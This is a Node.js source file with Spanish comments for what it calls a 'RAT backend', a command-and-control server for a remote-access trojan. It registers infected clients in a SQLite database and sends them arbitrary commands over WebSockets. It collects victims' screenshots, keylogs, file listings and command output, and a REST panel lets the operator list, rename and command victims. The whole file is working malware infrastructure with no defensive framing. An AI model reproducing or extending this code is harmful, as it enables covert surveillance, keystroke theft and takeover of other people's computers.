const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Base de datos SQLite
const db = new sqlite3.Database(path.join(__dirname, 'rats.db'));
db.run(`CREATE TABLE IF NOT EXISTS clients (
  id TEXT PRIMARY KEY,
  customName TEXT,
  ip TEXT,
  lastSeen INTEGER,
  os TEXT,
  hostname TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  clientId TEXT,
  command TEXT,
  params TEXT,
  status TEXT DEFAULT 'pending',
  result TEXT,
  timestamp INTEGER
)`);

// Servidor HTTP + WebSocket
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Clientes conectados activamente
const activeClients = new Map(); // clientId -> WebSocket

// ============ WEBSOCKET ============
wss.on('connection', (ws, req) => {
  const clientId = req.headers['x-client-id'] || 'unknown-' + Date.now();
  const ip = req.socket.remoteAddress || '0.0.0.0';
  const hostname = req.headers['x-hostname'] || 'unknown';

  // Registrar cliente en BD
  db.run(`INSERT OR REPLACE INTO clients (id, ip, lastSeen, hostname) VALUES (?, ?, ?, ?)`,
    [clientId, ip, Date.now(), hostname]);

  activeClients.set(clientId, ws);
  console.log(`[+] Cliente conectado: ${clientId} desde ${ip}`);

  // Heartbeat
  const interval = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    } else {
      clearInterval(interval);
      activeClients.delete(clientId);
      db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
    }
  }, 5000);

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'pong') {
        db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
      }
      if (data.type === 'screenshot') {
        // Guardar screenshot en BD o enviar al panel
        console.log(`[+] Screenshot recibido de ${clientId}`);
      }
      if (data.type === 'keylog') {
        console.log(`[+] Keylog recibido de ${clientId}: ${data.text}`);
      }
      if (data.type === 'cmd_result') {
        db.run(`UPDATE commands SET result = ?, status = 'done' WHERE id = ?`,
          [data.result, data.cmdId]);
      }
      if (data.type === 'files_result') {
        // Guardar listado de archivos
        console.log(`[+] Archivos recibidos de ${clientId}`);
      }
    } catch (e) {
      console.log('Error en mensaje:', e.message);
    }
  });

  ws.on('close', () => {
    clearInterval(interval);
    activeClients.delete(clientId);
    db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
    console.log(`[-] Cliente desconectado: ${clientId}`);
  });
});

// ============ API REST ============

// Obtener lista de clientes
app.get('/api/clients', (req, res) => {
  db.all('SELECT * FROM clients ORDER BY lastSeen DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    // Añadir estado online
    const result = rows.map(c => ({
      ...c,
      online: activeClients.has(c.id)
    }));
    res.json(result);
  });
});

// Renombrar cliente
app.post('/api/rename', (req, res) => {
  const { id, customName } = req.body;
  if (!id || !customName) return res.status(400).json({ error: 'Faltan datos' });
  db.run('UPDATE clients SET customName = ? WHERE id = ?', [customName, id], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ ok: true });
  });
});

// Enviar comando a un cliente
app.post('/api/command', (req, res) => {
  const { clientId, command, params } = req.body;
  if (!clientId || !command) return res.status(400).json({ error: 'Faltan datos' });

  const ws = activeClients.get(clientId);
  if (!ws) return res.status(404).json({ error: 'Cliente no conectado' });

  const cmdId = Date.now();
  const cmdObj = { id: cmdId, command, params: params || '' };
  ws.send(JSON.stringify({ type: 'command', data: cmdObj }));

  db.run(`INSERT INTO commands (clientId, command, params, timestamp) VALUES (?, ?, ?, ?)`,
    [clientId, command, JSON.stringify(params || ''), Date.now()]);

  res.json({ ok: true, cmdId });
});

// Obtener historial de comandos
app.get('/api/commands/:clientId', (req, res) => {
  const { clientId } = req.params;
  db.all('SELECT * FROM commands WHERE clientId = ? ORDER BY timestamp DESC LIMIT 50',
    [clientId], (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json(rows);
    });
});

// Ruta raíz para verificar que el servidor funciona
app.get('/', (req, res) => {
  res.json({ 
    status: 'RAT Backend running',
    clients: activeClients.size,
    uptime: process.uptime()
  });
});

// Iniciar servidor
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] Servidor RAT backend corriendo en puerto ${PORT}`);
  console.log(`[+] Clientes activos: 0`);
});